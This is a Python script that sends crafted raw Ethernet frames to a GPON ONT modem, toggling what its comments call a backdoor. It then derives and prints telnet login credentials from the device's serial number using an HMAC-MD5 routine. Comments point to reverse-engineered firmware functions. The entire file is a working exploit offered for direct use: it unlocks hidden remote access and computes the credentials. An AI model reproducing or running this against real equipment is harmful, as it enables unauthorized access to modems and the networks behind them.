#!/usr/bin/python
import socket, os, sys, struct
from CIGpass import vos_hmac_md5_ssh

if os.geteuid() != 0:
	print("Nuh uh! Raw sockets need root.")
	sys.exit(1)

# creating a rawSocket for communications
rawSocket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x99C1))

# Fill in your ethernet name
rawSocket.bind(("eth_change_me", socket.htons(0xC199)))

# create a ethernet packet
# Fill in your modem mac and ethernet mac
# See NetMgr sub_40A6D8
MAC_DATA = struct.pack("!6s6s2s", bytes.fromhex('E4:8E:10:DD:EE:FF'.replace(':','')), bytes.fromhex('AA:BB:CC:DD:EE:FF'.replace(':','')), b'\xC1\x99')

if len(sys.argv) != 3:
        print(f"{sys.argv[0]} enable|disable GPONSN")
        sys.exit(1)

gpon_sn = sys.argv[2]

# Enable shouldn't care about format but telnet login does...
if len(sys.argv[2]) != 12:
        print("Invalid PON SN, Expected format AAAAbbbbbbbb")
        sys.exit(1)

gpon_sn = gpon_sn[0:4].upper() + gpon_sn[4:12].lower()

if sys.argv[1] != "enable" and sys.argv[1] != "disable":
        print('First argument must be "enable" or "disable" ')
        sys.exit(1)

payload = b''
# See NetMgt sub_40A2E4
if( sys.argv[1] == "disable"):
        #         | Eth header |                                           | GPON SN                      | code XORs 2 values, 0x00 makes it easy     | padding
        payload = ( MAC_DATA + b'\xdd\xdd\x00\x00\x00\x00\x00\x00\x00\x00' + bytes(gpon_sn, "utf8")[::-1] +  bytes.fromhex("000000000000000000000000") + b'a'*32 )

if( sys.argv[1] == "enable" ):
        payload = ( MAC_DATA + b'\xee\xee\x00\x00\x00\x00\xff\xff\xff\xff' + bytes(gpon_sn, "utf8")[::-1] +  bytes.fromhex("000000000000000000000000") + b'a'*32 )
        # Note that i ran "#ONT/system/misc>admin_en set 1" before testing this so backdoor might not work unless you do it aswell.
        # There might be a VOS_SendMsg in NetMgr call that enables it but thats for you to test...
        telnet_usr = gpon_sn 		# Must be AAAAbbbbbbbb
        pass_sn = gpon_sn.upper()	# Must be AAAABBBBBBBB
        telnet_pass = vos_hmac_md5_ssh(pass_sn, 8)
        print(f"Try login at 192.168.100.1\nUsername: {telnet_usr}\nPassword: {telnet_pass}\n")

rawSocket.send(payload)
rawSocket.close()
